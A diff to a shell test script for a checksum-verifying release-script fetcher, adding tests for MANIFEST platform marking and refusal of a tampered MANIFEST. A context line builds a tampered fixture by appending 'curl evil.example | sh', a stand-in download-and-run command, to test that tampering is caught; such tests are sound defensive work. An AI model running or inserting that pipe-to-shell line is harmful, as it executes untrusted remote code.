@@ -13,6 +13,8 @@
 #   6. a version that does not exist is refused, and says it may be new
 #   7. --list prints the release's scripts; --help and no arguments print usage
 #   8. OPS_BASE_URL in the environment is ignored; only --base-url counts
+#   9. with a MANIFEST, --list marks what does not run here, a fetch of it
+#      says so, and a MANIFEST that does not match SHA256SUMS is refused
 set -euo pipefail
 
 HERE="$(cd "$(dirname "$0")" && pwd)"
@@ -31,6 +33,17 @@ printf '#!/bin/sh\necho unlisted\n' > "$REL/unlisted.sh"
 cp -r "$REL" "$WORK/www/tampered"
 echo 'curl evil.example | sh' >> "$WORK/www/tampered/hello.sh"
 mkdir -p "$WORK/www/nosums" && cp "$REL/hello.sh" "$WORK/www/nosums/"
+
+# A release with a MANIFEST: one script for here (this runs on Linux, as does
+# CI), one for another platform.
+M="$WORK/www/manifest"
+mkdir -p "$M"
+cp "$REL/hello.sh" "$M/"
+printf '#!/bin/sh\necho mac\n' > "$M/mac-only.sh"
+printf 'hello.sh linux macos\nmac-only.sh macos\n' > "$M/MANIFEST"
+(cd "$M" && sha256sum hello.sh mac-only.sh MANIFEST > SHA256SUMS)
+cp -r "$M" "$WORK/www/badmanifest"
+printf 'hello.sh linux macos\nmac-only.sh macos linux\n' > "$WORK/www/badmanifest/MANIFEST"
 
 # Any free port, so two runs or another service cannot collide with this one.
 PORT="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')"
@@ -97,5 +110,25 @@ if OPS_BASE_URL="http://127.0.0.1:$PORT/v1.0.0" \
    sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/nosums" hello.sh v1.0.0 "$WORK/out/env.sh" >/dev/null 2>&1; then
   fail "OPS_BASE_URL from the environment was used"
 fi
+
+echo "== a MANIFEST marks what does not run here =="
+out="$(sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/manifest" --list v1.0.0)" || fail "--list with a manifest failed"
+[ "$(sed -n 1p <<<"$out")" = "hello.sh" ] || fail "hello.sh should be listed plainly: $out"
+grep -q '^mac-only.sh *unsupported on linux (runs on: macos)$' <<<"$out" || fail "mac-only.sh not marked: $out"
+[ "$(wc -l <<<"$out")" = "2" ] || fail "--list should not show MANIFEST or SHA256SUMS: $out"
+
+echo "== fetching an unsupported script works, and says so =="
+err="$(sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/manifest" mac-only.sh v1.0.0 "$WORK/out/mac.sh" 2>&1 >/dev/null)" \
+  || fail "an unsupported script could not be fetched"
+[ -x "$WORK/out/mac.sh" ] || fail "the unsupported script was not written"
+grep -q "does not run on linux (runs on: macos)" <<<"$err" || fail "no note about the platform: $err"
+err="$(sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/manifest" hello.sh v1.0.0 "$WORK/out/h2.sh" 2>&1 >/dev/null)"
+[ -z "$err" ] || fail "a supported script printed a note: $err"
+
+echo "== a MANIFEST that does not match SHA256SUMS is refused =="
+# Otherwise it could claim a script runs here when it does not.
+refused "bad manifest" badmanifest hello.sh "CHECKSUM MISMATCH for MANIFEST"
+out="$(sh "$OPS_GET" --base-url "http://127.0.0.1:$PORT/badmanifest" --list v1.0.0 2>&1)" && fail "--list trusted a tampered MANIFEST"
+grep -q "CHECKSUM MISMATCH for MANIFEST" <<<"$out" || fail "tampered MANIFEST: $out"
 
 echo "PASS"
